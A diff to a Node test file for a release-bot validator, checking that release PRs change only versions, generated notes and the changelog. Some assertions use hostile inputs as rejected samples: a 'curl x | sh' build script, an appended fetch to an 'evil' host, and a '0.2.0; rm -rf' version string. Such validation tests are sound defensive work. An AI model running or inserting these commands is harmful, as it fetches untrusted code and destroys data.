@@ -3,7 +3,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import {
   isReleaseOrHotfixHead, flowEnabled, releaseExtraFiles, proofLink, heldOffNote, isBackMerge, labelProblem,
-  pickPr, prState, releaseVersion, firstParagraph, releaseNotesModule, changelogSection, nextVersion, versionFromTitle, groupChangelog, usersSee, gateState, renderReleaseBody, changelogMarkdown, cell, neutralizeCommentMarkers, dropComments,
+  pickPr, prState, releaseVersion, firstParagraph, releaseNotesModule, changelogSection, nextVersion, versionFromTitle, groupChangelog, usersSee, gateState, renderReleaseBody, changelogMarkdown, cell, neutralizeCommentMarkers, dropComments, botFileProblems, versionProblems, versionIsNewer,
 } from './release-flow.mjs';
 
 test('only release/next and hotfix/<name> may open a PR into main', () => {
@@ -216,4 +216,52 @@ test('cell escapes backslashes before pipes, so a title cannot break the status 
   assert.equal(cell('plain'), 'plain');
   assert.equal(cell('Fix\n| #999 | ✅ verified |'), 'Fix \\| #999 \\| ✅ verified \\|');
   assert.equal(cell('</td><td>✅ verified'), '&lt;/td>&lt;td>✅ verified');
+});
+
+test('botFileProblems: release/next may change only the version and the generated notes', () => {
+  const pkg = (o) => `${JSON.stringify(o, null, 2)}\n`;
+  const base = { name: 'crx', version: '0.1.0', scripts: { build: 'vite build' } };
+  assert.deepEqual(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0' })), []);
+  assert.match(botFileProblems('package.json', pkg(base), pkg({ ...base, version: '0.2.0', scripts: { build: 'curl x | sh' } }))[0], /outside its version/);
+  const odd = { ...base, packages: { '': { version: '1' } } };
+  assert.match(botFileProblems('package.json', pkg(odd), pkg({ ...odd, packages: { '': { version: '2' } } }))[0], /outside its version/);
+  const lock = { name: 'crx', version: '0.1.0', packages: { '': { version: '0.1.0' }, 'node_modules/a': { version: '1.0.0' } } };
+  assert.deepEqual(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, version: '0.2.0', packages: { ...lock.packages, '': { version: '0.2.0' } } })), []);
+  assert.match(botFileProblems('package-lock.json', pkg(lock), pkg({ ...lock, packages: { ...lock.packages, 'node_modules/a': { version: '6.6.6' } } }))[0], /outside its version/);
+  const notes = releaseNotesModule({ version: '0.2.0', date: '2026-11-19', items: ['Faster invoices.'] });
+  assert.deepEqual(botFileProblems('src/releaseNotes.ts', 'old', notes), []);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', `${notes}fetch('https://evil');\n`)[0], /module the bot writes/);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', notes.replace('"items"', '"x": 1, "items"'))[0], /module the bot writes/);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', null)[0], /is missing/);
+  const log = '# Changelog\n\n## v0.1.0 (2026-11-12)\n\n- A\n';
+  assert.deepEqual(botFileProblems('CHANGELOG.md', log, log.replace('\n\n## v0.1.0', '\n\n## v0.2.0 (2026-11-19)\n\n- B\n\n## v0.1.0')), []);
+  assert.match(botFileProblems('CHANGELOG.md', log, '# Changelog\n')[0], /lost earlier release/);
+  assert.match(botFileProblems('CHANGELOG.md', log, null)[0], /missing/);
+  assert.match(botFileProblems('CHANGELOG.md', null, null)[0], /missing/);
+  assert.match(botFileProblems('CHANGELOG.md', log, log.replace('- A', '- rewritten'))[0], /changed or lost/);
+  assert.match(botFileProblems('CHANGELOG.md', log, log.replace('- A', '- A\n- added later'))[0], /changed or lost/);
+  assert.match(botFileProblems('CHANGELOG.md', '## v0.1.0 (2026-11-12)\n\n- A\n', '# Changelog\n')[0], /changed or lost/);
+  assert.match(botFileProblems('src/releaseNotes.ts', 'old', releaseNotesModule({ version: '0.2.0', date: 'tomorrow', items: [] }))[0], /module the bot writes/);
+  const code = `fetch('/x');\n${notes}`;
+  assert.match(botFileProblems('src/releaseNotes.ts', code, code)[0], /module the bot writes/);
+});
+
+test('versionProblems: one plain X.Y.Z across package.json, the lock and the notes', () => {
+  const j = (o) => JSON.stringify(o);
+  const notes = (v) => releaseNotesModule({ version: v, date: '2026-11-19', items: [] });
+  const lock = (a, b) => j({ version: a, packages: { '': { version: b } } });
+  assert.deepEqual(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.2.0'), notes('0.2.0')), []);
+  assert.match(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.3.0'), notes('0.2.0'))[0], /isn't one X.Y.Z/);
+  assert.match(versionProblems(j({ version: '0.2.0; rm -rf' }), lock('0.2.0; rm -rf', '0.2.0; rm -rf'), notes('0.2.0; rm -rf'))[0], /isn't one X.Y.Z/);
+  assert.match(versionProblems(null, lock('0.2.0', '0.2.0'), notes('0.2.0'))[0], /missing or unreadable/);
+  assert.match(versionProblems(j({ version: '01.2.3' }), lock('01.2.3', '01.2.3'), notes('01.2.3'))[0], /isn't one X.Y.Z/);
+  assert.deepEqual(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.2.0'), notes('0.2.0'), '# Changelog\n\n## v0.2.0 (2026-11-19)\n'), []);
+  assert.match(versionProblems(j({ version: '0.2.0' }), lock('0.2.0', '0.2.0'), notes('0.2.0'), '# Changelog\n\n## v0.1.0 (2026-11-12)\n')[0], /no section for v0.2.0/);
+});
+
+test('versionIsNewer compares X.Y.Z as numbers', () => {
+  assert.equal(versionIsNewer('0.2.0', '0.1.9'), true);
+  assert.equal(versionIsNewer('0.10.0', '0.9.0'), true);
+  assert.equal(versionIsNewer('1.3.9', '1.4.0'), false);
+  assert.equal(versionIsNewer('1.4.0', '1.4.0'), false);
 });
